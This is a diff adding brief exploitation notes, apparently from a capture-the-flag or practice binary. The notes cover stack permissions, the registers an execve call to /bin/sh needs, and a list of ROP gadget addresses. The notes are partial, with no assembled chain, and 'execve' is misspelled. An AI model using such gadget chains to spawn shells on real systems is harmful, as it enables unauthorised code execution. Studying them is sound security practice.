@@ -1,0 +1,14 @@
+vmmap -> view stack perms
+
+To make a syscall to /bin/sh we need 4 registers 
+
+sys_exeve -> const char *filename | const char *const argv |  const char *const envp[]
+
+0x000000000044db34 : pop rax ; ret
+
+0x0000000000401b73 : pop rdi ; ret
+0x0000000000437a85 : pop rdx ; ret
+
+0x0000000000401c87 : pop rsi ; ret
+0x000000000044526e : mov qword ptr [rax], rdx ; ret
+0x0000000000400488 : syscall
